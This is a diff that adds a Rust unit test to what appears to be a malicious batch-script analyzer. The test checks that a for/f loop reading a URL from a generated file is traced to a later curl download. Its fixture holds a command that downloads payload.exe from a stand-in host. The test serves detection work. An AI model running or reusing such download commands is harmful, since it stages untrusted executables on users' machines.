@@ -15041,6 +15041,27 @@ for /F "tokens=1,2 delims==" %%A in (%CFG%) do echo key=%%A value=%%B
     }
 
     #[test]
+    fn compact_for_f_reads_generated_file_source() {
+        use crate::traits::Trait;
+        let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
+for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://compact-for-f.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "compact for/f file source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_curl_public_ip_endpoint_feeds_later_variable() {
         use crate::traits::Trait;
         let script = br#"setlocal EnableDelayedExpansion
